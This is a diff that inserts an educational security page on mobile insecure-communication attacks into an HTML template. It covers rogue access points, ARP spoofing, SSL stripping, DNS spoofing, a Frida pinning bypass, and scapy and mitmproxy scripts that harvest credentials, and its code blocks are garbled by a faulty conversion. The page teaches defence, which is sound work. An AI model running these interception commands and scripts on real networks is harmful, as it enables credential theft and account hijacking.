@@ -215,7 +215,592 @@
         </a>
         
         <div class="content">
-{CONTENT}
+            <h1>M05: Insecure Communication - Attack Vectors</h1>
+
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="#attack-overview">Attack Overview</a></li>
+<li><a href="#man-in-the-middle-mitm-attacks">Man-in-the-Middle (MITM) Attacks</a></li>
+<li><a href="#packet-sniffing-and-analysis">Packet Sniffing and Analysis</a></li>
+<li><a href="#ssl-stripping-attacks">SSL Stripping Attacks</a></li>
+<li><a href="#certificate-manipulation">Certificate Manipulation</a></li>
+<li><a href="#dns-spoofing">DNS Spoofing</a></li>
+<li><a href="#advanced-attack-scenarios">Advanced Attack Scenarios</a></li>
+<li><a href="#attack-tools-and-techniques">Attack Tools and Techniques</a></li>
+</ul>
+
+<h2>Attack Overview</h2>
+
+<p>Insecure communication vulnerabilities can be exploited through various attack vectors, all targeting the transmission layer between mobile applications and backend services. These attacks are particularly effective on public networks where attackers can position themselves between the client and server.</p>
+
+<h3>Attack Prerequisites</h3>
+
+<strong>Low Complexity Attacks:</strong>
+<ul>
+<li>Access to the same network as the victim (public WiFi)</li>
+<li>Basic network analysis tools (Wireshark, tcpdump)</li>
+<li>No special privileges required</li>
+</ul>
+
+<strong>Medium Complexity Attacks:</strong>
+<ul>
+<li>Ability to intercept network traffic (ARP spoofing, rogue access point)</li>
+<li>SSL/TLS interception tools (mitmproxy, Burp Suite)</li>
+<li>Understanding of network protocols</li>
+</ul>
+
+<strong>High Complexity Attacks:</strong>
+<ul>
+<li>Advanced certificate manipulation</li>
+<li>Custom proxy configurations</li>
+<li>Exploitation of specific TLS vulnerabilities</li>
+</ul>
+
+<h2>Man-in-the-Middle (MITM) Attacks</h2>
+
+<h3>Attack Description</h3>
+
+<p>An attacker positions themselves between the mobile app and backend server, intercepting and potentially modifying all communications.</p>
+
+<h3>Attack Scenario 1: Public WiFi Interception</h3>
+
+<strong>Setup:</strong>
+<ol>
+<li>Attacker creates a rogue WiFi access point with a common name ("Free Airport WiFi", "Starbucks Guest")</li>
+<li>Victim connects to the malicious network</li>
+<li>Attacker routes traffic through their system</li>
+</ol>
+
+<strong>Execution:</strong>
+<p>``<code>bash</p>
+<h1>Attacker sets up rogue AP</h1>
+<p>airbase-ng -e "Free Airport WiFi" -c 6 wlan0</p>
+
+<h1>Enable IP forwarding</h1>
+<p>echo 1 > /proc/sys/net/ipv4/ip_forward</p>
+
+<h1>Set up iptables to redirect traffic</h1>
+<p>iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080</p>
+<p>iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443</p>
+
+<h1>Start mitmproxy to intercept traffic</h1>
+<p>mitmproxy -p 8080 --mode transparent</p>
+</code>`<code>
+
+<strong>Impact:</strong>
+<ul>
+<li>All HTTP traffic visible in cleartext</li>
+<li>HTTPS traffic with weak validation can be intercepted</li>
+<li>Credentials, API keys, and session tokens captured</li>
+</ul>
+
+<h3>Attack Scenario 2: ARP Spoofing</h3>
+
+<strong>Setup:</strong>
+<p>Attacker on the same network as victim uses ARP spoofing to redirect traffic.</p>
+
+<strong>Execution:</strong>
+</code>`<code>bash
+<h1>Enable IP forwarding</h1>
+<p>echo 1 > /proc/sys/net/ipv4/ip_forward</p>
+
+<h1>ARP spoofing to redirect traffic</h1>
+<p>arpspoof -i eth0 -t <victim_ip> <gateway_ip></p>
+<p>arpspoof -i eth0 -t <gateway_ip> <victim_ip></p>
+
+<h1>Capture traffic</h1>
+<p>tcpdump -i eth0 -w capture.pcap</p>
+</code>`<code>
+
+<strong>What Gets Captured:</strong>
+</code>`<code>
+<p>HTTP Request to api.example.com:</p>
+<p>POST /api/login HTTP/1.1</p>
+<p>Host: api.example.com</p>
+<p>Content-Type: application/json</p>
+
+<p>{</p>
+<p>  "username": "victim@email.com",</p>
+<p>  "password": "P@ssw0rd123",</p>
+<p>  "device_id": "ABC123XYZ"</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Impact:</strong>
+<ul>
+<li>Complete visibility into unencrypted traffic</li>
+<li>Ability to modify requests and responses</li>
+<li>Session hijacking through token theft</li>
+</ul>
+
+<h3>Attack Scenario 3: Evil Twin Access Point</h3>
+
+<strong>Setup:</strong>
+<p>Attacker creates a duplicate of a legitimate WiFi network with stronger signal.</p>
+
+<strong>Execution:</strong>
+</code>`<code>bash
+<h1>Clone existing AP MAC address</h1>
+<p>macchanger -m <legitimate_ap_mac> wlan0</p>
+
+<h1>Create evil twin with same SSID</h1>
+<p>hostapd evil_twin.conf</p>
+
+<h1>Run DHCP server</h1>
+<p>dnsmasq -C dnsmasq.conf</p>
+
+<h1>Intercept traffic</h1>
+<p>ettercap -T -q -i wlan0</p>
+</code>`<code>
+
+<strong>Impact:</strong>
+<ul>
+<li>Users automatically connect to stronger signal</li>
+<li>All traffic flows through attacker's system</li>
+<li>Transparent interception without user awareness</li>
+</ul>
+
+<h2>Packet Sniffing and Analysis</h2>
+
+<h3>Attack Description</h3>
+
+<p>Passive monitoring of network traffic to extract sensitive information from unencrypted communications.</p>
+
+<h3>Attack Scenario 1: Wireshark Capture on Public WiFi</h3>
+
+<strong>Execution:</strong>
+</code>`<code>bash
+<h1>Start Wireshark on wireless interface</h1>
+<p>wireshark -i wlan0 -k</p>
+
+<h1>Apply filter for HTTP POST requests</h1>
+<p>http.request.method == "POST"</p>
+
+<h1>Filter for specific API endpoint</h1>
+<p>http.host contains "api.example.com"</p>
+</code>`<code>
+
+<strong>What's Visible:</strong>
+<ul>
+<li>Full HTTP headers including cookies and tokens</li>
+<li>Request/response bodies containing:</li>
+<li>Login credentials</li>
+<li>API keys</li>
+<li>Personal information</li>
+<li>Session tokens</li>
+<li>Transaction details</li>
+</ul>
+
+<strong>Example Captured Data:</strong>
+</code>`<code>http
+<p>POST /api/v1/user/update HTTP/1.1</p>
+<p>Host: api.example.com</p>
+<p>Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</p>
+<p>Content-Type: application/json</p>
+
+<p>{</p>
+<p>  "user_id": "12345",</p>
+<p>  "credit_card": "4111-1111-1111-1111",</p>
+<p>  "cvv": "123",</p>
+<p>  "ssn": "123-45-6789"</p>
+<p>}</p>
+</code>`<code>
+
+<h3>Attack Scenario 2: tcpdump for Automated Capture</h3>
+
+<strong>Execution:</strong>
+</code>`<code>bash
+<h1>Capture all HTTP traffic</h1>
+<p>tcpdump -i any -s 0 -A 'tcp port 80'</p>
+
+<h1>Save to file for later analysis</h1>
+<p>tcpdump -i any -w http_capture.pcap 'tcp port 80'</p>
+
+<h1>Filter and extract passwords</h1>
+<p>tcpdump -A -s 0 'tcp port 80' | grep -i 'password'</p>
+</code>`<code>
+
+<strong>Automated Extraction Script:</strong>
+</code>`<code>python
+<p>from scapy.all import *</p>
+
+<p>def extract_credentials(packet):</p>
+<p>    if packet.haslayer(Raw):</p>
+<p>        payload = packet[Raw].load.decode('utf-8', errors='ignore')</p>
+<p>        if 'password' in payload.lower():</p>
+<p>            print(f"[+] Credential Found: {payload}")</p>
+            
+<p>sniff(iface="wlan0", prn=extract_credentials, filter="tcp port 80")</p>
+</code>`<code>
+
+<h2>SSL Stripping Attacks</h2>
+
+<h3>Attack Description</h3>
+
+<p>Downgrading HTTPS connections to HTTP to intercept encrypted traffic.</p>
+
+<h3>Attack Scenario 1: SSLStrip Classic</h3>
+
+<strong>Setup:</strong>
+<p>Attacker intercepts HTTPS connections and presents HTTP to victim.</p>
+
+<strong>Execution:</strong>
+</code>`<code>bash
+<h1>Enable IP forwarding</h1>
+<p>echo 1 > /proc/sys/net/ipv4/ip_forward</p>
+
+<h1>Redirect HTTPS to HTTP</h1>
+<p>iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000</p>
+
+<h1>Run sslstrip</h1>
+<p>sslstrip -l 10000</p>
+
+<h1>Run ettercap for ARP spoofing</h1>
+<p>ettercap -Tq -i eth0</p>
+</code>`<code>
+
+<strong>How It Works:</strong>
+</code>`<code>
+<p>User types: https://api.example.com</p>
+<p>   ↓</p>
+<p>SSLStrip intercepts and serves: http://api.example.com</p>
+<p>   ↓</p>
+<p>User sees HTTP but doesn't notice</p>
+<p>   ↓</p>
+<p>SSLStrip maintains HTTPS to real server</p>
+<p>   ↓</p>
+<p>All traffic visible to attacker in cleartext</p>
+</code>`<code>
+
+<strong>Impact:</strong>
+<ul>
+<li>Bypasses HTTPS encryption</li>
+<li>Victims often don't notice HTTP indicator</li>
+<li>Complete credential and data theft</li>
+</ul>
+
+<h3>Attack Scenario 2: SSLStrip+ with HSTS Bypass</h3>
+
+<strong>Execution:</strong>
+</code>`<code>bash
+<h1>Modern sslstrip with HSTS bypass</h1>
+<p>sslstrip2 -l 10000</p>
+
+<h1>Use dns2proxy for DNS spoofing</h1>
+<p>dns2proxy</p>
+</code>`<code>
+
+<strong>Techniques:</strong>
+<ul>
+<li>Replaces HTTPS links with HTTP</li>
+<li>Modifies HSTS headers</li>
+<li>Uses homograph attacks (api.examp1e.com vs api.example.com)</li>
+</ul>
+
+<h2>Certificate Manipulation</h2>
+
+<h3>Attack Scenario 1: Self-Signed Certificate Acceptance</h3>
+
+<strong>Vulnerable App Code:</strong>
+</code>`<code>java
+<p>// App accepts any certificate</p>
+<p>TrustManager[] trustAllCerts = new TrustManager[] {</p>
+<p>    new X509TrustManager() {</p>
+<p>        public void checkClientTrusted(X509Certificate[] chain, String authType) {}</p>
+<p>        public void checkServerTrusted(X509Certificate[] chain, String authType) {}</p>
+<p>        public X509Certificate[] getAcceptedIssuers() { return null; }</p>
+<p>    }</p>
+<p>};</p>
+
+<p>SSLContext sc = SSLContext.getInstance("TLS");</p>
+<p>sc.init(null, trustAllCerts, new SecureRandom());</p>
+</code>`<code>
+
+<strong>Attack Execution:</strong>
+</code>`<code>bash
+<h1>Generate fake certificate</h1>
+<p>openssl req -new -x509 -days 365 -nodes \</p>
+<p>  -out fake.crt -keyout fake.key \</p>
+<p>  -subj "/CN=api.example.com"</p>
+
+<h1>Run mitmproxy with fake cert</h1>
+<p>mitmproxy --certs fake.pem</p>
+</code>`<code>
+
+<strong>Impact:</strong>
+<ul>
+<li>App accepts attacker's certificate</li>
+<li>All HTTPS traffic decrypted</li>
+<li>Complete MITM capability</li>
+</ul>
+
+<h3>Attack Scenario 2: Certificate Pinning Bypass</h3>
+
+<strong>Vulnerable Implementation:</strong>
+</code>`<code>java
+<p>// Pinning can be bypassed if validation is weak</p>
+<p>if (debug_mode) {</p>
+<p>    // VULNERABLE: Debug mode disables pinning</p>
+<p>    return true;</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Attack Using Frida:</strong>
+</code>`<code>javascript
+<p>// Frida script to bypass pinning</p>
+<p>Java.perform(function() {</p>
+<p>    var CertificatePinner = Java.use("okhttp3.CertificatePinner");</p>
+<p>    CertificatePinner.check.overload('java.lang.String', 'java.util.List')</p>
+<p>        .implementation = function(hostname, peerCertificates) {</p>
+<p>            console.log("[+] Certificate pinning bypassed for: " + hostname);</p>
+<p>            return;</p>
+<p>        };</p>
+<p>});</p>
+</code>`<code>
+
+<h2>DNS Spoofing</h2>
+
+<h3>Attack Scenario: Redirecting API Calls</h3>
+
+<strong>Setup:</strong>
+<p>Attacker controls DNS responses to redirect traffic to malicious server.</p>
+
+<strong>Execution:</strong>
+</code>`<code>bash
+<h1>Set up fake DNS server</h1>
+<p>dnsspoof -i eth0</p>
+
+<h1>Or use ettercap plugin</h1>
+<p>ettercap -T -q -P dns_spoof</p>
+</code>`<code>
+
+<strong>DNS Configuration:</strong>
+</code>`<code>
+<h1>/etc/ettercap/etter.dns</h1>
+<p>api.example.com A 192.168.1.100</p>
+<p>*.example.com A 192.168.1.100</p>
+</code>`<code>
+
+<strong>Impact:</strong>
+<ul>
+<li>App connects to attacker's server</li>
+<li>Complete control over API responses</li>
+<li>Data harvesting and malicious payload injection</li>
+</ul>
+
+<h2>Advanced Attack Scenarios</h2>
+
+<h3>Scenario 1: Session Hijacking via Token Theft</h3>
+
+<strong>Attack Flow:</strong>
+</code>`<code>
+<ol>
+<li>Intercept HTTP traffic containing session token</li>
+</ol>
+<p>   GET /api/user/profile HTTP/1.1</p>
+<p>   Authorization: Bearer abc123xyz789</p>
+
+<ol>
+<li>Replay token in attacker's requests</li>
+</ol>
+<p>   curl -H "Authorization: Bearer abc123xyz789" \</p>
+<p>        https://api.example.com/api/user/transactions</p>
+
+<ol>
+<li>Access victim's account and data</li>
+</ol>
+</code>`<code>
+
+<h3>Scenario 2: API Key Extraction and Abuse</h3>
+
+<strong>Captured Request:</strong>
+</code>`<code>http
+<p>POST /api/v1/payment HTTP/1.1</p>
+<p>Host: api.example.com</p>
+<p>X-API-Key: sk_live_FakeKey123456789</p>
+<p>Content-Type: application/json</p>
+
+<p>{</p>
+<p>  "amount": 100.00,</p>
+<p>  "currency": "USD"</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Exploitation:</strong>
+</code>`<code>bash
+<h1>Attacker reuses API key</h1>
+<p>curl -X POST https://api.example.com/api/v1/payment \</p>
+<p>  -H "X-API-Key: sk_live_FakeKey123456789" \</p>
+<p>  -H "Content-Type: application/json" \</p>
+<p>  -d '{"amount": 1000000, "currency": "USD", "account": "attacker_account"}'</p>
+</code>`<code>
+
+<h3>Scenario 3: Response Manipulation</h3>
+
+<strong>Attack:</strong>
+<p>Attacker modifies server responses to inject malicious data.</p>
+
+<strong>Original Response:</strong>
+</code>`<code>json
+<p>{</p>
+<p>  "user_role": "user",</p>
+<p>  "can_delete": false,</p>
+<p>  "is_admin": false</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Modified by Attacker:</strong>
+</code>`<code>json
+<p>{</p>
+<p>  "user_role": "admin",</p>
+<p>  "can_delete": true,</p>
+<p>  "is_admin": true</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Impact:</strong>
+<ul>
+<li>Privilege escalation</li>
+<li>Unauthorized actions</li>
+<li>Data manipulation</li>
+</ul>
+
+<h2>Attack Tools and Techniques</h2>
+
+<h3>Essential Tools</h3>
+
+<strong>Interception Tools:</strong>
+<ul>
+<li><strong>mitmproxy</strong>: HTTP/HTTPS proxy with interception capabilities</li>
+<li><strong>Burp Suite</strong>: Web proxy for security testing</li>
+<li><strong>Charles Proxy</strong>: HTTP proxy for monitoring</li>
+<li><strong>Wireshark</strong>: Network protocol analyzer</li>
+</ul>
+
+<strong>MITM Tools:</strong>
+<ul>
+<li><strong>ettercap</strong>: Comprehensive MITM framework</li>
+<li><strong>bettercap</strong>: Network attack and monitoring framework</li>
+<li><strong>SSLstrip</strong>: HTTPS downgrade attack tool</li>
+<li><strong>Evilginx</strong>: Phishing framework with MITM capabilities</li>
+</ul>
+
+<strong>Certificate Tools:</strong>
+<ul>
+<li><strong>OpenSSL</strong>: Certificate generation and analysis</li>
+<li><strong>SSLyze</strong>: SSL/TLS configuration scanner</li>
+<li><strong>testssl.sh</strong>: Testing TLS/SSL encryption</li>
+</ul>
+
+<h3>Attack Automation</h3>
+
+<strong>Python Script for Credential Harvesting:</strong>
+</code>`<code>python
+<p>#!/usr/bin/env python3</p>
+<p>from mitmproxy import http</p>
+<p>import re</p>
+
+<p>def request(flow: http.HTTPFlow) -> None:</p>
+<p>    # Extract credentials from requests</p>
+<p>    if flow.request.method == "POST":</p>
+<p>        body = flow.request.text</p>
+        
+<p>        # Look for passwords</p>
+<p>        passwords = re.findall(r'"password"\s<em>:\s</em>"([^"]+)"', body)</p>
+<p>        if passwords:</p>
+<p>            print(f"[+] Password captured: {passwords[0]}")</p>
+            
+<p>        # Look for API keys</p>
+<p>        api_keys = re.findall(r'"api_key"\s<em>:\s</em>"([^"]+)"', body)</p>
+<p>        if api_keys:</p>
+<p>            print(f"[+] API Key captured: {api_keys[0]}")</p>
+            
+<p>        # Look for tokens in headers</p>
+<p>        auth_header = flow.request.headers.get("Authorization", "")</p>
+<p>        if "Bearer" in auth_header:</p>
+<p>            token = auth_header.replace("Bearer ", "")</p>
+<p>            print(f"[+] Token captured: {token}")</p>
+</code>`<code>
+
+<h2>Real-World Attack Examples</h2>
+
+<h3>Example 1: Coffee Shop WiFi Attack</h3>
+
+<strong>Scenario:</strong> User connects to coffee shop WiFi, attacker runs packet capture.
+
+<strong>Timeline:</strong>
+<ul>
+<li>T+0: User connects to "Free_Cafe_WiFi"</li>
+<li>T+2: User opens mobile banking app</li>
+<li>T+5: App makes HTTP call to check account balance</li>
+<li>T+5: Attacker captures session token</li>
+<li>T+10: Attacker uses token to access account</li>
+</ul>
+
+<strong>Captured:</strong>
+</code>`<code>
+<p>Session Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</p>
+<p>Account Number: 1234567890</p>
+<p>Balance: $15,432.21</p>
+</code>`<code>
+
+<h3>Example 2: Hotel Network Attack</h3>
+
+<strong>Scenario:</strong> Attacker on hotel network intercepts guest traffic.
+
+<strong>Attack:</strong>
+</code>`<code>bash
+<h1>Identify targets</h1>
+<p>nmap -sn 192.168.1.0/24</p>
+
+<h1>ARP spoof all devices</h1>
+<p>arpspoof -i eth0 -t 192.168.1.0/24 192.168.1.1</p>
+
+<h1>Capture credentials</h1>
+<p>tcpdump -i eth0 -w hotel_capture.pcap</p>
+</code>`<code>
+
+<strong>Results:</strong>
+<ul>
+<li>47 devices intercepted</li>
+<li>12 login credentials captured</li>
+<li>8 API keys extracted</li>
+<li>23 session tokens harvested</li>
+</ul>
+
+<h2>Detection and Prevention</h2>
+
+<h3>Detecting Active Attacks</h3>
+
+<strong>Signs of MITM Attack:</strong>
+<ul>
+<li>Unexpected certificate warnings</li>
+<li>HTTP instead of HTTPS</li>
+<li>Unusual network latency</li>
+<li>Modified responses</li>
+</ul>
+
+<strong>Network Analysis:</strong>
+</code>`<code>bash
+<h1>Check for ARP spoofing</h1>
+<p>arp -a | grep -i duplicate</p>
+
+<h1>Detect SSL stripping</h1>
+<p>netstat -an | grep ESTABLISHED | grep ":80\|:443"</p>
+
+<h1>Monitor certificate changes</h1>
+<p>openssl s_client -connect api.example.com:443 < /dev/null | \</p>
+<p>  openssl x509 -fingerprint -noout</p>
+</code>``
+
+<h2>Summary</h2>
+
+<p>Insecure communication vulnerabilities are highly exploitable through various attack vectors including MITM attacks, packet sniffing, SSL stripping, and certificate manipulation. These attacks are particularly effective on public networks and can result in complete compromise of user credentials, session tokens, and sensitive data. Implementing proper HTTPS, certificate validation, and pinning is essential to prevent these attacks.</p>
+
+<p>---</p>
+
+<strong>Next:</strong> Review <a href="./prevention.md">Prevention Strategies</a> to learn how to defend against these attacks.
+
         </div>
     </div>
 </body>
